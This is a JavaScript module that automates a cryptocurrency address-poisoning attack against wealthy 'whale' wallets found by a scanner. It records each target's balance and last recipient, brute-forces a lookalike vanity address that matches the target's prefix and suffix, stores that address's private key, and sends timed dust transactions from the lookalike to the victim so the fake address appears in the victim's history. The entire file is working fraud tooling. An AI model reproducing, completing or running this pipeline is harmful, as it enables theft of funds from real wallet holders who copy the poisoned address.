import { generate as cpuGenerate } from './vanity/generator-cpu.js';
import { deriveAddress, toChecksumAddress } from './vanity/utils.js';
import { storeVanityKey } from './tx/vault.js';
import { sendTx } from './tx/sender.js';
import { getTiming } from './timing.js';
import { saveTarget, saveVanity, addVanityTxHash, incrementDailyStat } from './lib/db.js';
import { CHAINS } from './config/chains.js';

const MAIN_WALLET = process.env.MAIN_WALLET;
const PREFIX_LEN = parseInt(process.env.VANITY_PREFIX || '4', 10);
const SUFFIX_LEN = parseInt(process.env.VANITY_SUFFIX || '4', 10);

function log(msg) {
  console.log(`[${new Date().toISOString().slice(11, 19)}][PIPELINE] ${msg}`);
}

/**
 * Full vanity pipeline triggered by scanner match:
 * 1. Generate vanity address matching the whale
 * 2. Store encrypted key in Redis
 * 3. Send timed TX from vanity → whale
 *
 * @param {object} opts
 * @param {string} opts.targetAddress - whale address detected by scanner
 * @param {string} opts.chainKey - chain where whale was found
 * @param {number} opts.score - wallet score from scanner
 */
export async function runVanityPipeline({ targetAddress, chainKey, score, nativeBalance, nativeSymbol, lastTxTo, txCount, isRecurrent }) {
  const chain = CHAINS[chainKey];
  const clean = targetAddress.replace(/^0x/i, '').toLowerCase();
  const prefix = clean.slice(0, PREFIX_LEN);
  const suffix = clean.slice(-SUFFIX_LEN);
  const matchChars = `${PREFIX_LEN}+${SUFFIX_LEN}`;

  // ── Save target to DB ─────────────────────────────
  await saveTarget(chainKey, targetAddress, {
    balance: nativeBalance || 0,
    lastTxTo: lastTxTo || '',
    txCount: txCount || 0,
    isRecurrent: isRecurrent || false,
    lastTestTx: new Date().toISOString(),
    score,
  });
  await incrementDailyStat('scored', 1);

  // ── Step 1: Vanity Gen ────────────────────────────
  log(`[1/3] Generating vanity for ${prefix}...${suffix} (score: ${score})`);

  const startGen = Date.now();
  const vanityResult = await cpuGenerate({
    prefix,
    suffix,
    onProgress: (attempts, speed) => {
      const elapsed = ((Date.now() - startGen) / 1000).toFixed(0);
      process.stdout.write(`\r  [VANITY] ${attempts.toLocaleString()} attempts | ${speed.toLocaleString()} keys/sec | ${elapsed}s`);
    },
  });

  // Verify
  const derived = deriveAddress(vanityResult.privateKey);
  if (derived.toLowerCase() !== vanityResult.address.toLowerCase()) {
    throw new Error('Vanity key verification FAILED — aborting pipeline');
  }

  const checksumAddr = toChecksumAddress(vanityResult.address);
  const genTime = ((Date.now() - startGen) / 1000).toFixed(1);
  log(`\n  [1/3] Vanity found: ${checksumAddr} (${genTime}s, ${vanityResult.attempts.toLocaleString()} attempts)`);

  // ── Step 2: Store in Redis (vault + vanity table) ─
  log(`[2/3] Storing encrypted key in Redis...`);

  await storeVanityKey({
    targetAddress,
    vanityAddress: checksumAddr,
    privateKey: vanityResult.privateKey,
    prefix,
    suffix,
  });

  await saveVanity(checksumAddr, {
    privateKey: '(encrypted in vault)',
    whale: targetAddress,
    recipient: lastTxTo || targetAddress,
    chain: chainKey,
    matchChars,
    txHashes: [],
  });

  log(`[2/3] Key stored (vault + vanity:${checksumAddr.slice(0, 10)}...)`);

  // ── Step 3: Timing + TX Sequence ───────────────────
  const timing = await getTiming(score, chainKey);
  log(`[3/3] Timing: ${timing.reason}`);
  log(`  TX #1 in ${timing.delaySec1}s, TX #2 in ${timing.delaySec2}s`);

  const txSteps = [
    { amount: '0.001', delaySec: timing.delaySec1 },
    { amount: '0.001', delaySec: timing.delaySec2 },
  ];

  log(`  ${checksumAddr} → ${targetAddress} on ${chain.name}`);

  for (let i = 0; i < txSteps.length; i++) {
    const { amount, delaySec } = txSteps[i];

    log(`  [TX ${i + 1}/${txSteps.length}] waiting ${delaySec}s...`);
    await sleep(delaySec * 1000);

    log(`  [TX ${i + 1}/${txSteps.length}] sending ${amount} ${chain.nativeSymbol}...`);

    try {
      const result = await sendTx({
        chainKey,
        privateKey: vanityResult.privateKey,
        to: targetAddress,
        amount,
      });
      log(`  [TX ${i + 1}/${txSteps.length}] Confirmed: ${result.hash}`);
      await addVanityTxHash(checksumAddr, result.hash);
      await incrementDailyStat('sent', 1);
      await incrementDailyStat('gasSpent', parseFloat(result.gasUsed) * 0.000000001); // rough gwei→USD
    } catch (err) {
      log(`  [TX ${i + 1}/${txSteps.length}] FAILED: ${err.message}`);
    }
  }

  log(`Pipeline complete for ${targetAddress} on ${chain.name}`);
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}
